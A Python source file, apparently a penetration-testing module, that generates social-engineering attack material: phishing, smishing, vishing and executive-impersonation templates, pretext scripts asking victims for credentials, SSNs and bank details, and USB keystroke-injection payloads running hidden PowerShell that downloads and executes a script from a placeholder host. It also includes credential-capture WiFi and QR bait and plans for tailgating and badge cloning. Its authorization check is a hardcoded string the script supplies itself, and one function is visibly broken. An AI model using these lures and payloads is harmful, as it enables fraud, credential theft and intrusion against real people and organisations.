#!/usr/bin/env python3
"""
Social Engineering Advanced Module - Authorized Security Testing
BlackSentinel Strike

Phishing simulation, pretexting scenarios, baiting tests,
and physical security assessments for authorized pentesting.

For authorized security testing only.
Requires written authorization before execution.
"""
import subprocess
import json


class SocialEngineeringAdvanced:
    def __init__(self, callback=None):
        self.callback = callback
        self.results = {}
        self._authorized = False

    def run_command(self, cmd, timeout=30):
        try:
            result = subprocess.run(cmd, shell=True, capture_output=True, text=True, timeout=timeout)
            return result.stdout + result.stderr
        except subprocess.TimeoutExpired:
            return f"[!] Command timed out after {timeout}s"
        except Exception as e:
            return f"[!] Error: {str(e)}"

    def _log(self, msg):
        if self.callback:
            self.callback(msg)

    def authorize(self, auth_code):
        if auth_code == "AUTHORIZED_PENTEST":
            self._authorized = True
            self._log("[+] Social engineering module authorized")
            return True
        return False

    def _check_auth(self):
        if not self._authorized:
            return False
        return True

    # ================================================================ PHISHING SIMULATION
    def setup_gophish(self, target_domain):
        self._log(f"[*] Setting up GoPhish campaign for {target_domain}")
        output = self.run_command("which gophish 2>/dev/null || echo 'gophish not installed'", timeout=5)
        if "not installed" in output:
            return f"[*] GoPhish not installed. Install from: https://getgophish.com\n[*] Config for {target_domain}: Create campaign with template URLs pointing to gophish server"
        output = self.run_command("gophish --version 2>&1 || echo 'available'", timeout=5)
        return f"[+] GoPhish available. Configure campaign for {target_domain}:\n1. Create email template\n2. Set sending profile\n3. Import user group\n4. Configure landing page\n5. Launch campaign"

    def create_phishing_email(self, scenario="credential_harvest"):
        templates = {
            "credential_harvest": {
                "subject": "Action Required: Account Verification Needed",
                "body": "Dear User,\n\nWe've detected unusual activity on your account. Please verify your credentials immediately to avoid temporary suspension.\n\nClick here to verify: [LINK]\n\nIT Security Team",
                "type": "Credential Harvest"
            },
            "mfa_bypass": {
                "subject": "Your MFA Code",
                "body": "Your verification code is: [CODE]\nThis code expires in 5 minutes.\nIf you didn't request this, ignore this message.",
                "type": "MFA Bypass"
            },
            "oauth_consent": {
                "subject": "External App Access Request",
                "body": "[SENDER] has requested access to your [SERVICE] account.\nApprove: [LINK]\nDeny: [LINK]",
                "type": "OAuth Consent"
            },
            "password_reset": {
                "subject": "Password Reset Request",
                "body": "A password reset was requested for your account.\nIf this was you, click: [LINK]\nIf not, contact IT immediately.",
                "type": "Password Reset"
            },
            "sharepoint": {
                "subject": "[NAME] shared a document with you",
                "body": "[SENDER] shared 'Q4_Report.xlsx' with you.\nView Document: [LINK]\nThis link expires in 24 hours.",
                "type": "SharePoint Lure"
            }
        }
        template = templates.get(scenario, templates["credential_harvest"])
        return json.dumps(template, indent=2)

    def simulate_spearphishing(self, target_email, scenario="credential"):
        self._log(f"[*] Generating spearphishing scenario for {target_email}")
        if not self._check_auth():
            return "[!] Authorization required. Use authorize('AUTHORIZED_PENTEST') first"
        result = {
            "target": target_email,
            "scenario": scenario,
            "template": self.create_phishing_email(scenario),
            "status": "Template ready for authorized testing",
            "note": "This is a SIMULATION for authorized pentesting only"
        }
        return json.dumps(result, indent=2)

    def simulate_whaling(self, target_name, company):
        self._log(f"[*] Generating whaling scenario for {target_name} at {company}")
        if not self._check_auth():
            return "[!] Authorization required"
        result = {
            "target": f"{target_name}@{company.lower().replace(' ', '')}.com",
            "scenario": "whaling",
            "template": {
                "subject": f"Board Meeting - {company} Confidential",
                "body": f"Dear {target_name},\n\nPlease review the attached merger documents before Thursday's board meeting.\n\nAccess: [LINK]\n\nBest regards,\nCEO Office",
                "type": "Executive Spearphishing"
            },
            "status": "Template ready for authorized testing"
        }
        return json.dumps(result, indent=2)

    def simulate_vishing(self, target_phone, scenario="tech_support"):
        self._log(f"[*] Generating vishing scenario for {target_phone}")
        if not self._check_auth():
            return "[!] Authorization required"
        scenarios = {
            "tech_support": {
                "pretext": "Call from IT helpdesk about detected malware",
                "goals": ["Get remote access credentials", "Install remote tool", "Get VPN details"],
                "script": "Hello, this is IT Security. We detected malware on your machine. We need immediate access to fix it."
            },
            "executive": {
                "pretext": "CEO needs urgent wire transfer",
                "goals": ["Wire authorization", "Bank details", "Amount confirmation"],
                "script": "This is urgent. I need you to process a wire transfer immediately."
            },
            "hr": {
                "pretext": "HR needs to verify benefits enrollment",
                "goals": ["SSN", "Date of birth", "Bank details"],
                "script": "Hi, I'm from HR. We need to verify your benefits enrollment information."
            }
        }
        result = {
            "target": target_phone,
            "scenario": scenario,
            "details": scenarios.get(scenario, scenarios["tech_support"]),
            "status": "Script ready for authorized testing"
        }
        return json.dumps(result, indent=2)

    def simulate_smishing(self, target_phone, scenario="package"):
        self._log(f"[*] Generating smishing scenario for {target_phone}")
        if not self._check_auth():
            return "[!] Authorization required"
        messages = {
            "package": "USPS: Your package cannot be delivered. Confirm address: [LINK]",
            "bank": "Your bank account has been locked. Verify identity: [LINK]",
            "prize": "Congratulations! You won a $1000 gift card. Claim: [LINK]",
            "covid": "COVID Alert: You've been exposed. Report: [LINK]",
            "tax": "IRS: You have a pending refund. Claim: [LINK]"
        }
        result = {
            "target": target_phone,
            "scenario": scenario,
            "message": messages.get(scenario, messages["package"]),
            "status": "Message ready for authorized testing"
        }
        return json.dumps(result, indent=2)

    def simulate_angler_phishing(self, target_brand):
        self._log(f"[*] Generating angler phishing for {target_brand}")
        if not self._check_auth():
            return "[!] Authorization required"
        result = {
            "brand": target_brand,
            "scenario": "Social media impersonation",
            "fake_accounts": [
                f"@{target_brand.lower()}support",
                f"@{target_brand.lower()}help",
                f"{target_brand.lower()}_support_official"
            ],
            "template": {
                "bio": f"Official {target_brand} Support. DM us for immediate assistance.",
                "responses": [
                    "I see the issue. Please DM me your account details so I can help.",
                    "We need to verify your identity. Click this link to confirm.",
                    "There's a known issue. Let me send you the fix."
                ]
            },
            "status": "Template ready for authorized testing"
        }
        return json.dumps(result, indent=2)

    def simulate_clone_phishing(self, target_url):
        self._log(f"[*] Generating clone phishing scenario for {target_url}")
        if not self._check_auth():
            return "[!] Authorization required"
        result = {
            "original_url": target_url,
            "clone_method": "Page cloning with credential capture",
            "steps": [
                f"1. Clone {target_url} with wget --mirror",
                "2. Replace form action URLs with capture endpoint",
                "3. Host on attacker-controlled domain",
                "4. Send phishing link to targets"
            ],
            "tools": ["SET (Social Engineering Toolkit)", "GoPhish", "Evilginx2"],
            "status": "Clone scenario ready for authorized testing"
        }
        return json.dumps(result, indent=2)

    # ================================================================ PRETEXTING
    def generate_pretext(self, scenario="tech_support"):
        pretexts = {
            "tech_support": {
                "role": "IT Help Desk Technician",
                "company": "Tech Solutions Inc.",
                "phone": "1-800-555-HELP",
                "script": [
                    "Hi, this is [NAME] from IT Support.",
                    "We detected unusual activity from your workstation.",
                    "We need to run a remote diagnostic tool.",
                    "Can you provide your login credentials for verification?"
                ],
                "tools_needed": ["Remote desktop tool", "Fake diagnostic software"],
                "data_targets": ["Credentials", "VPN access", "System information"]
            },
            "delivery": {
                "role": "Delivery Courier",
                "company": "Express Delivery Co.",
                "phone": "1-800-555-SEND",
                "script": [
                    "I have a package for [NAME].",
                    "There's an issue with the address label.",
                    "Can you confirm your full name and address?",
                    "I also need a signature for this package."
                ],
                "tools_needed": ["Fake delivery uniform", "Package with tracking device"],
                "data_targets": ["Full name", "Address", "Signature"]
            },
            "inspector": {
                "role": "Building Inspector",
                "company": "City Safety Department",
                "phone": "1-555-555-SAFE",
                "script": [
                    "I'm here for the annual safety inspection.",
                    "We need to check the server room.",
                    "Can you escort me to the network closet?",
                    "I need to document all equipment serial numbers."
                ],
                "tools_needed": ["Fake badge", "Clipboard with forms", "Camera"],
                "data_targets": ["Physical access", "Network equipment", "Server details"]
            },
            "auditor": {
                "role": "External Auditor",
                "company": "AuditFirm LLC",
                "phone": "1-555-555-AUDIT",
                "script": [
                    "I'm here for the quarterly security audit.",
                    "We need to verify access controls.",
                    "Can you provide the current admin password?",
                    "We also need to check firewall rules."
                ],
                "tools_needed": ["Fake business card", "Audit documentation"],
                "data_targets": ["Admin credentials", "Network diagrams", "Security policies"]
            },
            "vendor": {
                "role": "Vendor Technician",
                "company": "VendorTech Services",
                "phone": "1-555-555-VNDR",
                "script": [
                    "I'm here for the scheduled maintenance.",
                    "We need to update the network equipment.",
                    "Can you provide console access?",
                    "We also need to verify the current configuration."
                ],
                "tools_needed": ["Vendor badge", "Equipment bag", "Fake work order"],
                "data_targets": ["Console access", "Configuration", "Network topology"]
            }
        }
        pretext = pretexts.get(scenario, pretexts["tech_support"])
        return json.dumps(pretext, indent=2)

    def simulate_pretext_call(self, target_phone, scenario):
        self._log(f"[*] Generating pretexting call for {target_phone}")
        if not self._check_auth():
            return "[!] Authorization required"
        pretext = self.generate_pretext(scenario)
        result = {
            "target": target_phone,
            "scenario": scenario,
            "pretext": json.loads(pretext),
            "call_script": self.generate_pretext(scenario)["script"],
            "status": "Pretext ready for authorized testing"
        }
        return json.dumps(result, indent=2)

    # ================================================================ BAITING
    def create_usb_bait(self, payload_type="rubber_ducky"):
        self._log(f"[*] Creating USB bait with {payload_type} payload")
        if not self._check_auth():
            return "[!] Authorization required"
        payloads = {
            "rubber_ducky": {
                "device": "USB Rubber Ducky",
                "script": "DELAY 1000\nGUI r\nDELAY 500\nSTRING cmd\nENTER\nDELAY 500\nSTRING powershell -ep bypass -w hidden -c \"IEX(New-Object Net.WebClient).DownloadString('http://YOUR_IP/shell.ps1')\"\nENTER",
                "description": "Keystroke injection payload"
            },
            "badusb": {
                "device": "Arduino-based USB",
                "script": "Keyboard.begin();\nKeyboard.println(\"powershell -ep bypass -w hidden\");\nKeyboard.println(\"IEX(New-Object Net.WebClient).DownloadString('http://YOUR_IP/shell.ps1')\");",
                "description": "Arduino USB attack device"
            },
            "usbdrop": {
                "device": "Standard USB Drive",
                "contents": [" autorun.inf", " report.docx.exe", " salary_2024.xlsx.exe"],
                "description": "Social engineering USB drop"
            },
            "hak5_wifi_pineapple": {
                "device": "WiFi Pineapple",
                "attack": "Evil Portal + credential capture",
                "description": "Rogue access point"
            }
        }
        payload = payloads.get(payload_type, payloads["rubber_ducky"])
        return json.dumps(payload, indent=2)

    def create_qr_bait(self, destination="credential_page"):
        self._log(f"[*] Creating QR code bait for {destination}")
        if not self._check_auth():
            return "[!] Authorization required"
        result = {
            "destination": destination,
            "qr_scenarios": [
                {"label": "Free WiFi", "url": "http://YOUR_IP/captive", "placement": "Break room"},
                {"label": "Employee Survey", "url": "http://YOUR_IP/survey", "placement": "Common areas"},
                {"label": "Package Tracking", "url": "http://YOUR_IP/track", "placement": "Reception"},
                {"label": "Event Registration", "url": "http://YOUR_IP/event", "placement": "Conference room"}
            ],
            "tools": ["qrencode", "ZBar"],
            "command": "qrencode -o qr_bait.png 'http://YOUR_IP/captive'",
            "status": "QR bait ready for authorized testing"
        }
        return json.dumps(result, indent=2)

    def create_wifi_bait(self, ssid="FreeWiFi_Secure"):
        self._log(f"[*] Creating WiFi bait hotspot: {ssid}")
        if not self._check_auth():
            return "[!] Authorization required"
        result = {
            "ssid": ssid,
            "config": {
                "hostapd_conf": f"interface=wlan0\ndriver=nl80211\nssid={ssid}\nhw_mode=g\nchannel=6\nwpa=2\nwpa_passphrase=welcome123\nwpa_key_mgmt=WPA-PSK",
                "dhcp_range": "192.168.1.100,192.168.1.200",
                "gateway": "192.168.1.1",
                "dns": "8.8.8.8"
            },
            "captive_portal": "Credential harvesting login page",
            "capture_options": [
                "Captive portal with fake login",
                "HTTPS redirect with certificate warning",
                "Terms of service acceptance with credential capture"
            ],
            "status": "WiFi bait ready for authorized testing"
        }
        return json.dumps(result, indent=2)

    def create_free_software_bait(self, software="video_player"):
        self._log(f"[*] Creating free software bait: {software}")
        if not self._check_auth():
            return "[!] Authorization required"
        software_map = {
            "video_player": {"name": "Pro Video Player", "file": "VideoPlayer_Pro_Setup.exe"},
            "vpn": {"name": "SecureVPN Free", "file": "SecureVPN_Setup.exe"},
            "antivirus": {"name": "FreeAntiVirus", "file": "FreeAV_Install.exe"},
            "pdf_reader": {"name": "PDF Pro Reader", "file": "PDFReader_Pro.exe"},
            "password_manager": {"name": "PasswordSafe", "file": "PasswordSafe_Setup.exe"}
        }
        sw = software_map.get(software, software_map["video_player"])
        result = {
            "software": sw["name"],
            "file": sw["file"],
            "distribution": ["Fake download site", "Forum posts", "Social media"],
            "payload_options": ["Reverse shell", "Credential stealer", "RAT"],
            "status": "Software bait ready for authorized testing"
        }
        return json.dumps(result, indent=2)

    # ================================================================ PHYSICAL
    def tailgating_plan(self, target_location):
        self._log(f"[*] Creating tailgating plan for {target_location}")
        if not self._check_auth():
            return "[!] Authorization required"
        result = {
            "target": target_location,
            "techniques": [
                "Follow employee through secured door",
                "Carry large box to appear as delivery",
                "Use clipboard to appear as inspector",
                "Talk on phone to appear distracted",
                "Ask employee to hold door"
            ],
            "tools": [
                "Fake ID badge",
                "Company-branded clothing",
                "Coffee cup (to occupy hands)",
                "Clipboard with fake forms"
            ],
            "timing": "During shift changes (8-9am, 5-6pm)",
            "status": "Tailgating plan ready for authorized testing"
        }
        return json.dumps(result, indent=2)

    def dumpster_diving_plan(self, target_company):
        self._log(f"[*] Creating dumpster diving plan for {target_company}")
        if not self._check_auth():
            return "[!] Authorization required"
        result = {
            "target": target_company,
            "target_items": [
                "Printed documents with credentials",
                "Old hardware with drives",
                "Post-it notes with passwords",
                "Network diagrams",
                "Employee directories",
                "Old access badges"
            ],
            "tools": [
                "Flashlight",
                "Gloves",
                "Trash bags",
                "Document scanner",
                "USB drive for extraction"
            ],
            "timing": "Before scheduled trash pickup",
            "legal_note": "Verify local laws - dumpster diving legality varies by jurisdiction",
            "status": "Dumpster diving plan ready for authorized testing"
        }
        return json.dumps(result, indent=2)

    def badge_cloning_plan(self, badge_type="proximity"):
        self._log(f"[*] Creating badge cloning plan for {badge_type} badges")
        if not self._check_auth():
            return "[!] Authorization required"
        badge_info = {
            "proximity": {
                "reader": "Proxmark3",
                "freq": "125kHz or 13.56MHz",
                "steps": ["Read badge", "Clone to blank", "Test access"],
                "blank_cost": "$5-15 per blank"
            },
            "smart_card": {
                "reader": "Card reader + software",
                "steps": ["Skim card data", "Write to compatible card", "Test access"],
                "difficulty": "Medium-High"
            },
            "nfc": {
                "reader": "ACR122U or smartphone",
                "steps": ["Read NFC data", "Clone to NFC tag", "Test access"],
                "blank_cost": "$1-3 per tag"
            }
        }
        info = badge_info.get(badge_type, badge_info["proximity"])
        result = {
            "badge_type": badge_type,
            "details": info,
            "status": "Badge cloning plan ready for authorized testing"
        }
        return json.dumps(result, indent=2)

    def lockpicking_plan(self):
        self._log("[*] Creating lockpicking assessment plan")
        if not self._check_auth():
            return "[!] Authorization required"
        result = {
            "locks_to_test": [
                {"type": "Pin Tumbler", "tool": "Pick set", "difficulty": "Easy-Medium"},
                {"type": "Wafer Lock", "tool": "Wafer picks", "difficulty": "Easy"},
                {"type": "Disc Detainer", "tool": "Disc pick", "difficulty": "Hard"},
                {"type": "Lever Lock", "tool": "Lever picks", "difficulty": "Medium"},
                {"type": "Master Lock", "tool": "Combination decode", "difficulty": "Easy"},
                {"type": "Smart Lock", "tool": "Vulnerability scan", "difficulty": "Variable"}
            ],
            "tools": [
                "Pick set (hooks, rakes, diamonds)",
                "Tension wrenches",
                "Bump keys",
                "Decode tools",
                "Practice locks"
            ],
            "approach": "Test all physical access points systematically",
            "status": "Lockpicking assessment ready for authorized testing"
        }
        return json.dumps(result, indent=2)

    # ================================================================ COMPREHENSIVE
    def full_social_engineering_audit(self, target):
        self._log(f"[*] Starting full social engineering audit for {target}")
        if not self._check_auth():
            return "[!] Authorization required. Use authorize('AUTHORIZED_PENTEST') first"
        results = []
        results.append("=== PHISHING SCENARIOS ===")
        results.append(self.create_phishing_email("credential_harvest"))
        results.append("\n=== PRETEXTING SCENARIOS ===")
        results.append(self.generate_pretext("tech_support"))
        results.append("\n=== BAITING SCENARIOS ===")
        results.append(self.create_usb_bait("rubber_ducky"))
        results.append("\n=== PHYSICAL SCENARIOS ===")
        results.append(self.tailgating_plan(target))
        return '\n'.join(results)


if __name__ == "__main__":
    import sys
    if len(sys.argv) < 2:
        print("Usage: social_adv.py <target>")
        sys.exit(1)
    se = SocialEngineeringAdvanced()
    se.authorize("AUTHORIZED_PENTEST")
    print(se.full_social_engineering_audit(sys.argv[1]))
